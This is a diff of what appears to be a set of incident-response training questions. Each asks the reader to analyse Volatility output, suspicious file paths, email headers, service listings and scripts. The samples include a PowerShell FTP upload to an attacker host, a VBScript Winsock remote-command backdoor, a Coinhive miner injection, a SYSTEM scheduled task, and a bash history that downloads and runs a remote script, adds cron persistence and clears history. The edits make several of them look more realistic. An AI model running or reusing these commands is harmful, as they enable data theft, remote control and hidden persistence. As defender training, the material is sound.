@@ -1,6 +1,6 @@
 ## Analyze output from memory forensic tool. Can you see something suspicious?
 ```
-vol.py -f /home/htb-student/MemoryDumps/rootkit.vmem pslist
+vol.py -f /home/john/MemoryDumps/rootkit.vmem pslist
 Volatility Foundation Volatility Framework 2.6.1
 /usr/local/lib/python2.7/dist-packages/volatility/plugins/community/YingLi/ssh_agent_key.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
   from cryptography.hazmat.backends.openssl import backend
@@ -23,48 +23,22 @@ Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Star
 0x81863138 cmd.exe                2980   1444      0 --------      0      0 2023-06-24 07:31:16 UTC+0000
 ```
 
-## During incident investigation you found some files tell me which one looks potentialy suspicious and why?
+## During incident investigation you found some interesting files tell me which one looks potentialy suspicious and why?
 ```
-Common Suspicious File Paths
-Temp and AppData Directories
-
 C:\Users\username\AppData\Local\Temp\cmd.exe
 C:\Users\username\AppData\Roaming\svchost.exe
 C:\Users\username\AppData\Local\Microsoft\Edge\User Data\Default\Extensions\payload.js
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\script.bat
-
-System Directories with Unusual Files
-
-C:\Windows\System32\drivers\etc\hosts (unexpected modifications)
-C:\Windows\System32\svchost.exe (wrong location or mismatched hash)
-C:\Windows\SysWOW64\calc.exe (unexpectedly replaced)
-Startup and Registry Paths
-
-
-C:\Users\Public\Documents\autorun.inf
-HKLM\Software\Microsoft\Windows\CurrentVersion\Run\malicious.exe
-Downloads and Suspicious User Files
-
+C:\Windows\System32\drivers\etc\hosts 
+C:\Windows\System32\svchost.exe 
+C:\Windows\SysWOW64\calc.exe
 C:\Users\username\Downloads\invoice_1234.exe
 C:\Users\username\Desktop\passwords.scr
 C:\Users\username\Pictures\image.jpg.exe
-Unusual or Misleading Filenames
-explorer.exe (located in a non-system directory)
-notepad.exe (hash mismatch)
-svch0st.exe (typo-squatting legit process names)
-taskmgr.exe (copy in unexpected directories)
-winlogon123.exe
-Indicators of Persistence or Evasion
-Hidden or System Files
-
 C:\Users\username\AppData\Local\Temp\.hidden_payload.dll
 C:\Windows\System32\drivers\.driver.sys
-Obfuscated Filenames
-
 C:\Users\username\AppData\Local\Temp\O1iIl1.exe
 C:\Windows\Temp\{GUID}.exe
-Unexpected Locations
-
 C:\Recycle\Desktop.ini
 C:\Windows\Help\help.pdf.exe
 ```
@@ -77,11 +51,10 @@ Pid      Process              Start              End                Tag         
 -------  ------------------   ----------------   ----------------   ---------------  -------------
 1548     explorer.exe         0x0000000002000000 0x0000000002010000 VadS             PAGE_EXECUTE_READWRITE
 1548     explorer.exe         0x0000000003000000 0x0000000003010000 VadS             PAGE_READWRITE
-...
+
 ```
 ## Analyze rest of it what potentaily is going on?
 ```
-Part 2.
 Details for VAD at 0x0000000002000000:
 ---------------------------------------------------
 Memory protection: PAGE_EXECUTE_READWRITE
@@ -123,7 +96,7 @@ while ($true) {
 }
 ```
 
-##
+## Identify language and script purpose.
 ```
 $ftpServer = "ftp://attacker.com"
 $ftpUser = "attacker"
@@ -137,7 +110,7 @@ $ftpRequest.GetRequestStream().Write($fileContent, 0, $fileContent.Length)
 $ftpRequest.GetResponse()
 ```
 
-##
+## Identify language and script purpose.
 ```
 Set objSocket = CreateObject("MSWinsock.Winsock")
 objSocket.RemoteHost = "ms-win32-update-live.ru"
@@ -159,7 +132,7 @@ Function ExecuteCommand(command)
 End Function
 ```
 
-##
+## Identify language and script purpose.
 ```
 var script = document.createElement("script");
 script.src = "https://cdn.jsdelivr.net/npm/coinhive@2.0.0/lib/coinhive.min.js";
@@ -171,7 +144,7 @@ script.onload = function() {
 };
 ```
 
-##
+## Investigate below email headers. What can suggest that something is wrong?
 ```
 Return-Path: <noreply@company.com>
 Received: from mail.server.com (mail.server.com [192.168.1.10]) by mail.mydomain.com with ESMTP id a1b2c3d4 for <recipient@mydomain.com>; Thu, 3 Dec 2024 10:02:05 -0500 (EST)
@@ -194,10 +167,10 @@ X-Phishing-Alert: Potential Phishing Attempt Detected
 
 ##
 ```
-schtasks /create /tn "MaliciousTask" /tr "C:\Windows\System32\cmd.exe /c C:\Users\Public\malicious.bat" /sc once /st 00:00 /ru SYSTEM
+schtasks /create /tn "UpdateTask" /tr "C:\Windows\System32\cmd.exe /c C:\Users\Public\update.bat" /sc once /st 00:00 /ru SYSTEM
 ```
 
-##
+## Analyze output from below command. What may be worth investigating?
 ```
 Get-WmiObject -Class Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName 
 
@@ -208,17 +181,17 @@ wuauserv            Windows Update             Running  Manual      C:\Windows\S
 w32time             Windows Time               Running  Manual      C:\Windows\System32\svchost.exe -k LocalService
 Task Schedular      Windwos Task Scheduler     Running  Auto        C:\Windows\Tasks\scheduled.exe
 Spooler             Print Spooler              Running  Auto        C:\Windows\System32\spoolsv.exe
-MaliciousService    Malicious Service          Running  Auto        C:\Users\Public\notepad.exe
+WindowsSysService   WinSys Service             Running  Auto        C:\Users\Public\notepad.exe
 SystemUpdateService System Update Service      Running  Auto        C:\Windows\Temp\system_update.exe
 UdkUserSvc_268339   Udk User Service_268339    Stopped  Manual      C:\Windows\System32\svchost.exe -k UdkSvcGroup
 ```
 
-##
+## Investigate output of bash_history can you tell me what user tried to acheive here?
 ```
 ls -alh /home/user
 find / -name "config*" -exec cat {} \;
 echo "10.10.10.1" >> /etc/hosts
-ping -c 4 attacker.com
+ping -c 4 win-updater-live.ru
 mkdir -p /var/tmp/new_folder
 cp /bin/bash /var/tmp/new_folder/bash
 chmod +x /var/tmp/new_folder/bash
@@ -226,16 +199,10 @@ chmod +x /var/tmp/new_folder/bash
 echo "attacker_password" | sudo -S usermod -aG sudo attacker
 ssh -o StrictHostKeyChecking=no -i /root/.ssh/id_rsa attacker@192.168.1.10
 echo "0 3 * * * /tmp/persistence_script.sh" >> /var/spool/cron/crontabs/root
-wget http://attacker.com/persistence_script.sh -O /tmp/persistence_script.sh
+wget http://win-updater-live.ru/persistence_script.sh -O /tmp/persistence_script.sh
 chmod +x /tmp/persistence_script.sh
 /tmp/persistence_script.sh
 cat /etc/passwd | grep root
 chmod 700 /home/attacker/.ssh
 history -c
-```
-##
-```
-```
-##
-```
 ```
